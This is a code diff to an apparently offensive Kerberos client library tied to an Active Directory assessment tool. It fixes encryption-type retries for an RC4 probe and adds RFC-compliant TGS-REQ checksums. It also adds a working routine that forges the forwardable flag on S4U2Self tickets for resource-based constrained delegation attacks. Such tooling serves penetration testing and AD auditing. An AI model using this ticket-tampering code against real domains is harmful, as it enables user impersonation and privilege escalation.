@@ -32,7 +32,8 @@ from kerbad.common.creds import KerberosCredential
 from kerbad.common.target import KerberosTarget
 from kerbad.protocol.rfc4556 import PKAuthenticator, AuthPack, PA_PK_AS_REP, KDCDHKeyInfo, PA_PK_AS_REQ
 from kerbad.gssapi.channelbindings import ChannelBindingsStruct
-from kerbad.protocol.ticketutils import construct_apreq_from_tgs_tgt
+from kerbad.protocol.ticketutils import construct_apreq_from_tgs_tgt, \
+	decrypt_enc_ticket_part, reencrypt_enc_ticket_part, set_enc_ticket_part_flag
 
 from asn1crypto import cms
 from asn1crypto import core
@@ -408,6 +409,19 @@ class AIOKerberosClient:
 				# If the server suggested encryption methods, we will use them
 				if e.krb_err_msg.get('e-data'):
 					srv_etype,default_supported_etypes = self.select_preferred_encryption_method(e.krb_err_msg)
+					# ADscan vendor fix: respect an explicit caller etype restriction.
+					# When get_TGT was called with override_etype, the server-suggested
+					# retry MUST stay within that list. select_preferred_encryption_method
+					# derives srv_etype from the credential's FULL supported set (it ignores
+					# the per-call override_etype), so without this guard an RC4-only request
+					# (e.g. the posture RC4 probe, override_etype=[23]) silently retries with
+					# the server's AES and falsely succeeds — making the probe report RC4 as
+					# accepted on an AES-only KDC. When no override was given, follow the
+					# server as before.
+					if override_etype is not None and srv_etype.value not in supported_etypes:
+						if etype_int == supported_etypes[-1]:
+							raise e
+						continue
 					logger.debug('Trying with supported suggested etype %s' % srv_etype.name)
 					preauth_rep = await self.do_preauth(srv_etype, with_pac=with_pac)
 					break
@@ -515,19 +529,29 @@ class AIOKerberosClient:
 		authenticator_data['cusec'] = now.microsecond
 		authenticator_data['ctime'] = now.replace(microsecond=0)
 		
-		if is_linux:
-			ac = AuthenticatorChecksum()
-			ac.flags = 0
-			ac.channel_binding = b'\x00'*16
-			
-			chksum = {}
-			chksum['cksumtype'] = 0x8003
-			chksum['checksum'] = ac.to_bytes()
+		# RFC 4120 (3.3.2 / 7.5.1): the PA-TGS-REQ AP-REQ authenticator MUST carry
+		# a keyed checksum (key usage 6) over the KDC-REQ-BODY, using the checksum
+		# type that matches the TGT session-key enctype. Windows KDCs tolerate a
+		# missing authenticator checksum, but RFC-strict KDCs (MIT, Heimdal, Samba
+		# AD) reject it with KRB_AP_ERR_INAPP_CKSUM. Emit it unconditionally so we
+		# work against every compliant KDC, not just Windows. The GSSAPI 0x8003
+		# channel-binding checksum is NOT this checksum: it belongs in the AP-REQ
+		# sent to the application server (construct_apreq), never in the TGS-REQ.
+		from kerbad.protocol.encryption import make_checksum, Cksumtype
+		_etype_to_authcksum = {
+			Enctype.DES3: Cksumtype.SHA1_DES3,
+			Enctype.AES128: Cksumtype.SHA1_AES128,
+			Enctype.AES256: Cksumtype.SHA1_AES256,
+			Enctype.RC4: Cksumtype.HMAC_MD5,
+		}
+		req_body_obj = KDC_REQ_BODY(kdc_req_body)
+		_auth_cksumtype = _etype_to_authcksum.get(self.kerberos_cipher_type)
+		if _auth_cksumtype is not None:
+			authenticator_data['cksum'] = Checksum({
+				'cksumtype': _auth_cksumtype,
+				'checksum': make_checksum(_auth_cksumtype, self.kerberos_session_key, 6, req_body_obj.dump()),
+			})
 
-
-			authenticator_data['cksum'] = Checksum(chksum)
-			authenticator_data['seq-number'] = 0
-		
 		authenticator_data_enc = self.kerberos_cipher.encrypt(self.kerberos_session_key, 7, Authenticator(authenticator_data).dump(), None)
 		
 		ap_req = {}
@@ -546,7 +570,7 @@ class AIOKerberosClient:
 		kdc_req['pvno'] = krb5_pvno
 		kdc_req['msg-type'] = MESSAGE_TYPE.KRB_TGS_REQ.value
 		kdc_req['padata'] = [pa_data_1]
-		kdc_req['req-body'] = KDC_REQ_BODY(kdc_req_body)
+		kdc_req['req-body'] = req_body_obj
 		
 		req = TGS_REQ(kdc_req)
 		logger.debug('Constructing TGS request to server')
@@ -859,8 +883,48 @@ class AIOKerberosClient:
 			now=self._now()
 		)
 		
-	async def getST(self, target_user, service_spn):
+	def _force_s4u2self_ticket_forwardable(self, tgs):
+		"""Force the ``forwardable`` flag on an S4U2Self ticket in place.
+
+		Required for resource-based constrained delegation (RBCD) when the
+		minting account lacks ``TrustedToAuthForDelegation`` (no protocol
+		transition): the KDC then returns the S4U2Self ticket NON-forwardable and
+		refuses the subsequent S4U2Proxy with KDC_ERR_BADOPTION. The S4U2Self
+		ticket is encrypted with the account's OWN long-term key, so we decrypt it
+		(key usage 2), set the forwardable flag in the EncTicketPart, and
+		re-encrypt with the same key. Mirrors impacket ``getST.py``
+		``-force-forwardable``. No-op when the ticket is already forwardable.
+
+		Requires ``self.credential`` to hold the account's long-term secret
+		(password / NT hash / AES key) and, for AES-from-password, ``self.server_salt``
+		populated by a real ``get_TGT`` (the ETYPE-INFO2 salt probe).
+		"""
+		enc_part = tgs['ticket']['enc-part']
+		etype = int(enc_part['etype'])
+		# The S4U2Self ticket is encrypted with the requesting account's OWN
+		# long-term key. Reuse the canonical EncTicketPart crypto primitive
+		# (shared with raise_child_native's PAC injection). get_key_for_enctype
+		# expects an EncryptionType enum, not the raw int from the ticket
+		# (EncryptionType is a plain Enum, so a bare int matches no branch and
+		# hits the 'etype.name' error path) — convert it like get_supported_enctypes does.
+		key = Key(
+			_enctype_table[etype].enctype,
+			self.credential.get_key_for_enctype(EncryptionType(etype), salt=self.server_salt),
+		)
+		enc_ticket_part = decrypt_enc_ticket_part(enc_part, key)
+		if not set_enc_ticket_part_flag(enc_ticket_part, 'forwardable'):
+			logger.debug('[S4U2self] S4U2Self ticket already forwardable; no flip needed')
+			return
+		reencrypt_enc_ticket_part(enc_part, key, enc_ticket_part)
+		logger.debug('[S4U2self] Forced forwardable flag on S4U2Self ticket (RBCD, no T2A4D)')
+
+	async def getST(self, target_user, service_spn, force_forwardable = False):
 		tgs, encTGSRepPart, key  = await self.S4U2self(target_user)
+		if force_forwardable:
+			# RBCD: the account has no TrustedToAuthForDelegation, so the S4U2Self
+			# ticket comes back non-forwardable and S4U2Proxy would be refused
+			# (KDC_ERR_BADOPTION). Force the flag using the account's own key.
+			self._force_s4u2self_ticket_forwardable(tgs)
 		return await self.S4U2proxy(tgs['ticket'], service_spn)
 
 
